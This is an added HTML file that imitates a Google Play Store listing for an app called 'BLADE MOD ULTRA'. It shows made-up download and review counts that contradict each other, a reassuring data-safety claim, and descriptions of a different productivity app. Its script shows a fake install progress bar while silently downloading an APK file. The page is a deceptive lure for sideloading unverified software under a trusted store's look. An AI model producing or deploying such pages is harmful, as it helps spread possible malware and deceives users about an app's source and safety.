@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Play Store</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-color: #1a73e8;
+      --secondary-color: #0d5bba;
+      --success-color: #0f9d58;
+      --rating-color: #ffb400;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border-color: #dadce0;
+      --background-color: #f8f9fa;
+    }
+    
+    body {
+      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: var(--background-color);
+      color: var(--text-primary);
+      padding-bottom: 60px;
+    }
+    .container {
+      padding: 16px;
+      max-width: 500px;
+      margin: auto;
+      background: white;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      margin-top: 16px;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+    .header img {
+      width: 64px;
+      height: 64px;
+      border-radius: 16px;
+      object-fit: contain;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+    }
+    .header-text h2 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: 500;
+      color: var(--text-primary);
+    }
+    .header-text a {
+      color: var(--primary-color);
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .rating {
+      display: flex;
+      align-items: center;
+      margin-top: 4px;
+    }
+    .rating-stars {
+      color: var(--rating-color);
+      font-size: 14px;
+      margin-right: 8px;
+    }
+    .rating-count {
+      color: var(--text-secondary);
+      font-size: 12px;
+    }
+    .info {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin: 20px 0;
+      padding-bottom: 16px;
+      border-bottom: 1px solid var(--border-color);
+    }
+    .info div {
+      text-align: center;
+      font-size: 14px;
+      color: var(--text-secondary);
+    }
+    .info i {
+      display: block;
+      margin-bottom: 4px;
+      font-size: 18px;
+      color: var(--primary-color);
+    }
+    .install-button {
+      background-color: var(--primary-color);
+      color: white;
+      text-align: center;
+      margin: 20px 0;
+      padding: 12px 24px;
+      font-weight: 500;
+      border-radius: 20px;
+      cursor: pointer;
+      font-size: 16px;
+      border: none;
+      width: 100%;
+      transition: all 0.2s;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+      height: 48px;
+    }
+    .install-button:hover {
+      background-color: var(--secondary-color);
+      transform: translateY(-1px);
+    }
+    .install-button:active {
+      transform: translateY(0);
+    }
+    .install-button.installing {
+      background-color: var(--text-secondary);
+    }
+    .install-button.installed {
+      background-color: var(--success-color);
+    }
+    .progress-container {
+      width: 100%;
+      height: 4px;
+      background-color: #e0e0e0;
+      border-radius: 2px;
+      margin: 10px 0;
+      overflow: hidden;
+      display: none;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      background-color: var(--primary-color);
+      transition: width 0.3s ease;
+    }
+    .screenshots-container {
+      margin: 24px 0;
+    }
+    .screenshots-title {
+      font-weight: 500;
+      margin-bottom: 12px;
+      color: var(--text-primary);
+    }
+    .screenshots {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding-bottom: 10px;
+      scrollbar-width: none;
+      -ms-overflow-style: none;
+    }
+    .screenshots::-webkit-scrollbar {
+      display: none;
+    }
+    .screenshots img {
+      height: 320px;
+      width: auto;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      border: 1px solid var(--border-color);
+    }
+    .about {
+      font-size: 14px;
+      line-height: 1.6;
+      margin: 24px 0;
+      color: var(--text-primary);
+    }
+    .about-title {
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+    .tags {
+      display: flex;
+      gap: 8px;
+      margin: 16px 0;
+      flex-wrap: wrap;
+    }
+    .tag {
+      background-color: #f0f0f0;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      color: var(--text-secondary);
+      transition: all 0.2s;
+    }
+    .tag:hover {
+      background-color: #e0e0e0;
+    }
+    .details {
+      margin: 24px 0;
+    }
+    .details-title {
+      font-weight: 500;
+      margin-bottom: 12px;
+      color: var(--text-primary);
+    }
+    .detail-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid var(--border-color);
+      font-size: 14px;
+    }
+    .detail-label {
+      color: var(--text-secondary);
+    }
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      max-width: 500px;
+      margin: 0 auto;
+      background-color: #fff;
+      border-top: 1px solid var(--border-color);
+      display: flex;
+      justify-content: space-around;
+      padding: 8px 0;
+      box-shadow: 0 -2px 5px rgba(0,0,0,0.05);
+    }
+    .nav-item {
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-secondary);
+      cursor: pointer;
+      padding: 8px;
+      border-radius: 8px;
+      transition: all 0.2s;
+    }
+    .nav-item:hover {
+      background-color: #f0f0f0;
+    }
+    .nav-item.active {
+      color: var(--primary-color);
+    }
+    .nav-item i {
+      font-size: 20px;
+      display: block;
+      margin-bottom: 4px;
+    }
+    .more-info {
+      margin-top: 24px;
+      font-size: 14px;
+    }
+    .info-section {
+      margin-bottom: 24px;
+    }
+    .info-title {
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: var(--text-primary);
+    }
+    .whats-new {
+      background-color: #f8f9fa;
+      padding: 12px;
+      border-radius: 8px;
+      margin: 16px 0;
+    }
+    .whats-new-title {
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: var(--primary-color);
+    }
+    .whats-new-content {
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .additional-info {
+      font-size: 12px;
+      color: var(--text-secondary);
+      margin-top: 24px;
+      text-align: center;
+    }
+    .expand-button {
+      color: var(--primary-color);
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 8px;
+      display: inline-block;
+    }
+    .hidden-content {
+      display: none;
+    }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://i.ibb.co/1YT7qQRC/app-icon.png" alt="Atharv App Icon" />
+      <div class="header-text">
+        <h2>BLADE MOD ULTRA</h2>
+        <a href="#">Blade Team</a>
+        <div class="rating">
+          <div class="rating-stars">
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star-half-alt"></i>
+          </div>
+          <div class="rating-count">2.7M reviews</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="info">
+      <div>
+        <i class="fas fa-download"></i>
+        15M+ downloads
+      </div>
+      <div>
+        <i class="fas fa-user-plus"></i>
+        Rated for 3+
+      </div>
+      <div>
+        <i class="fas fa-share-alt"></i>
+        Share
+      </div>
+    </div>
+
+    <div class="whats-new">
+      <div class="whats-new-title">What's new</div>
+      <div class="whats-new-content">
+        • New dark mode for better night-time use<br>
+        • Improved performance and bug fixes<br>
+        • Added calendar integration feature<br>
+        <span class="expand-button" id="expand-button">Read more</span>
+        <div class="hidden-content" id="hidden-content">
+          • Redesigned settings menu for easier navigation<br>
+          • Added 10 new productivity templates<br>
+          • Fixed issue with notification syncing
+        </div>
+      </div>
+    </div>
+
+    <button id="install-button" class="install-button">
+      <i class="fas fa-download" style="margin-right: 8px;"></i> Install
+    </button>
+    <div class="progress-container" id="progress-container">
+      <div class="progress-bar" id="progress-bar"></div>
+    </div>
+
+    <div class="screenshots-container">
+      <div class="screenshots-title">Screenshots</div>
+      <div class="screenshots">
+        <img src="https://i.ibb.co/MxWzdKBS/screenshot1.jpg" alt="App Screenshot 1" />
+        <img src="https://i.ibb.co/LzhRR3B1/screenshot2.jpg" alt="App Screenshot 2" />
+        <img src="https://i.ibb.co/yFnNyMRh/screenshot3.jpg" alt="App Screenshot 3" />
+      </div>
+    </div>
+
+    <div class="about">
+      <div class="about-title">About this app</div>
+      Atharv App is your complete solution for productivity and daily tasks. With intuitive features and a beautiful interface, it helps you organize your life and get things done efficiently.
+      <span class="expand-button" id="expand-about">Read more</span>
+      <div class="hidden-content" id="hidden-about">
+        Our app combines task management, note-taking, calendar, and file organization in one seamless experience. The clean design and powerful features make it perfect for students, professionals, and anyone looking to boost their productivity.
+      </div>
+    </div>
+
+    <div class="tags">
+      <div class="tag">#1 in Productivity</div>
+      <div class="tag">Organizer</div>
+      <div class="tag">Tools</div>
+      <div class="tag">Offline</div>
+      <div class="tag">Minimalist</div>
+    </div>
+
+    <div class="details">
+      <div class="details-title">Additional Information</div>
+      <div class="detail-item">
+        <span class="detail-label">Updated</span>
+        <span>June 15, 2023</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label">Version</span>
+        <span>2.3.4</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label">Requires Android</span>
+        <span>8.0 and up</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label">Downloads</span>
+        <span>15,000,000+</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label">Interactive Elements</span>
+        <span>Users Interact</span>
+      </div>
+      <div class="detail-item">
+        <span class="detail-label">In-app purchases</span>
+        <span>$0.99 - $9.99 per item</span>
+      </div>
+    </div>
+
+    <div class="more-info">
+      <div class="info-section">
+        <div class="info-title">Ratings and reviews</div>
+        <div class="rating">
+          <div class="rating-stars">
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star"></i>
+            <i class="fas fa-star-half-alt"></i>
+          </div>
+          <div>4.5 · 1.2M reviews</div>
+        </div>
+      </div>
+
+      <div class="info-section">
+        <div class="info-title">Data safety</div>
+        <div>Developer says this app doesn't share user data with other companies or organizations.</div>
+      </div>
+    </div>
+
+    <div class="additional-info">
+      <div>©2023 Atharv Team</div>
+      <div>This app is available for your device</div>
+    </div>
+  </div>
+
+  <div class="bottom-nav">
+    <div class="nav-item active">
+      <i class="fas fa-home"></i>
+      Home
+    </div>
+    <div class="nav-item">
+      <i class="fas fa-gamepad"></i>
+      Games
+    </div>
+    <div class="nav-item">
+      <i class="fas fa-apps"></i>
+      Apps
+    </div>
+    <div class="nav-item">
+      <i class="fas fa-book"></i>
+      Books
+    </div>
+    <div class="nav-item">
+      <i class="fas fa-ellipsis-h"></i>
+      More
+    </div>
+  </div>
+
+  <script>
+    const installButton = document.getElementById('install-button');
+    const progressContainer = document.getElementById('progress-container');
+    const progressBar = document.getElementById('progress-bar');
+    const expandButton = document.getElementById('expand-button');
+    const hiddenContent = document.getElementById('hidden-content');
+    const expandAbout = document.getElementById('expand-about');
+    const hiddenAbout = document.getElementById('hidden-about');
+    
+    // Expand buttons functionality
+    expandButton.addEventListener('click', function() {
+      hiddenContent.style.display = 'block';
+      expandButton.style.display = 'none';
+    });
+    
+    expandAbout.addEventListener('click', function() {
+      hiddenAbout.style.display = 'block';
+      expandAbout.style.display = 'none';
+    });
+    
+    // Install button functionality
+    installButton.addEventListener('click', startInstallation);
+    
+    function startInstallation() {
+      // Change button state
+      installButton.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right: 8px;"></i> Installing...';
+      installButton.classList.add('installing');
+      progressContainer.style.display = 'block';
+      
+      // Simulate download progress
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          installationComplete();
+        }
+        progressBar.style.width = `${progress}%`;
+      }, 300);
+      
+      // Actually initiate download
+      const link = document.createElement('a');
+      link.href = 'BLADE MOD ULTRA.apk';
+      link.download = 'BLADE MOD ULTRA.apk';
+      link.style.display = 'none';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+    
+    function installationComplete() {
+      installButton.innerHTML = '<i class="fas fa-check" style="margin-right: 8px;"></i> Open';
+      installButton.classList.remove('installing');
+      installButton.classList.add('installed');
+      progressContainer.style.display = 'none';
+      
+      // Change button behavior to "open" after installation
+      installButton.removeEventListener('click', startInstallation);
+      installButton.addEventListener('click', () => {
+        alert('Opening Atharv App...');
+      });
+    }
+    
+    // Bottom nav functionality
+    const navItems = document.querySelectorAll('.nav-item');
+    navItems.forEach(item => {
+      item.addEventListener('click', function() {
+        navItems.forEach(nav => nav.classList.remove('active'));
+        this.classList.add('active');
+      });
+    });
+  </script>
+</body>
+</html>
